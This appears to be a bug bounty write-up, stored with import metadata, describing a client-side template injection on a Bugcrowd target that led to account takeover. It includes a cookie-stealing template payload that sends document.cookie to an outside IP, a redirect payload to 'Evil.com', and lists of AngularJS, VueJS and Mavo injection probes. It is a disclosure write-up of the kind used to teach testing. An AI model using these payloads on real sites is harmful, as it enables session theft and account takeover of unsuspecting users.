---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-01-13_csti-lead-to-account-takeover.md
original_filename: 2022-01-13_csti-lead-to-account-takeover.md
title: C.S.T.I Lead To Account Takeover $$$
category: documents
detected_topics:
- xss
- sso
- idor
- command-injection
- rate-limit
tags:
- imported
- documents
- xss
- sso
- idor
- command-injection
- rate-limit
language: en
raw_sha256: 5654761a10d13f9131907d3c3d485ec334a5cd3421c98852ebdafad625669f79
text_sha256: e770563c119c73b31203bc5b03f0be95d3ee26970b8d820410b7b6424c5ffa10
ingested_at: '2026-06-28T07:32:09Z'
sensitivity: unknown
redactions_applied: false
---

# C.S.T.I Lead To Account Takeover $$$

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-01-13_csti-lead-to-account-takeover.md
- Source Type: markdown
- Detected Topics: xss, sso, idor, command-injection, rate-limit
- Ingested At: 2026-06-28T07:32:09Z
- Redactions Applied: False
- Raw SHA256: `5654761a10d13f9131907d3c3d485ec334a5cd3421c98852ebdafad625669f79`
- Text SHA256: `e770563c119c73b31203bc5b03f0be95d3ee26970b8d820410b7b6424c5ffa10`


## Content

---
title: "C.S.T.I Lead To Account Takeover $$$"
url: "https://systemweakness.com/c-s-t-i-lead-to-account-takeover-f21ea07d9141"
authors: ["M7.Arman (@ArmanSecurity)"]
bugs: ["CSTI", "Account takeover"]
publication_date: "2022-01-13"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3012
scraped_via: "browseros"
---

# C.S.T.I Lead To Account Takeover $$$

C.S.T.I Lead To Account Takeover $$$
M7arm4n
Follow
3 min read
·
Jan 13, 2022

204

4

Hello amazing hunter, Today I want to tell you a short story but this story has a long memory for me. In this story, I found some vulnerabilities with a payload. Let’s play this game…

Press enter or click to view image in full size

I decided to hunt a program on Bugcrowd, I had 131 domains to recon. So, I run my quick command to subdomain enumeration. I use subfinder , findomain , amass , assetfinder to find subdomains then use deduplicated to remove duplicates and use httpx 2 times, First, I only run httpx to find valid subdomain then fire it for 2xx status code. Now is time to take a screenshot from the 2xx.txt list. I have to notice this topic that this recon is the quick type that leads me only to find subdomains.

I recommend my friends to use a magic payload that leads to testing many vulnerabilities in a inject.

`“‘><img src=x onerror=promtp(7)>`”’${{8*8}}

As you see, My magic payload is simple but is useful to test HTML injection, XSS, C.S.T.I, S.S.T.I. Try to inject this payload in any input.

In this subdomain, you can create an account like a company and invite other users. Admin able to invite other users into the company. On the other hand in an endpoint, normal users and admin are able to create a page and this page has a lot of input and is able to upload pictures and etc.

The worst close was stored HTML injection that close as text injection :) As an attacker, I was able to completely inject all HTML tags. For example, create a form and etc…. As references, I sent a report from other platforms that resolve as a medium, But nothing change.

Time to the main story and the dark one. I decided some inputs of the page are vulnerable to C.S.T.I, I decided on this vulnerability by my magic payload, after saving the page returned 64 in inputs. Quickly create a report that leads attackers to inject C.S.T.I. For impact, if you use this payload:

{{constructor.constructor('new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;')()}}

Able to steal all user's cookies and takeover full accounts.

And you can use this one to redirect the page:

{{constructor.constructor('location.replace("https://Evil.com")')()}}

In the first report after 17 comments and many blockers close the report as N/A because: “we were unable to reproduce your issue” :).

Get M7arm4n’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I decided to report this again and this time a said zero to the hero of vulnerability and exploit it and record a video around 20 minutes. This time after 4 blockers i reward a $$$ bounty.

The scenario was simple, As a normal user or admin in the company, you are able to create a page, and this page has vulnerability inputs, After injecting the steal cookie payload every user open your Poisson page ( all user able to create pages and open other pages ) all victim cookie send you and able to account takeover like Admin account ( No HTTP-only protection was on cookies).

Recommend payload for different JavaScript libraries:

AngularJS:

{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
<input ng-focus=$event.view.alert('XSS')>
{{constructor.constructor('alert(1)')()}}
<input ng-focus=$event.view.alert('XSS')>

VueJS:

V3:
{{_openBlock.constructor('alert(1)')()}}
V2:
{{constructor.constructor('alert(1)')()}}

Mavo:

[7*7]
[(1,alert)(1)]
<div mv-expressions="{{ }}">{{top.alert(1)}}</div>
[self.alert(1)]
javascript:alert(1)%252f%252f..%252fcss-images
[Omglol mod 1 mod self.alert (1) andlol]
[''=''or self.alert(lol)]
<a data-mv-if='1 or self.alert(1)'>test</a>
<div data-mv-expressions="lolx lolx">lolxself.alert('lol')lolx</div>
<a href=[javascript&':alert(1)']>test</a>
[self.alert(1)mod1]

At the end of this story, I recommend you

look at bug bounty as a part-time job and enjoy it.

Don’t give up and Always upgrade yourself.
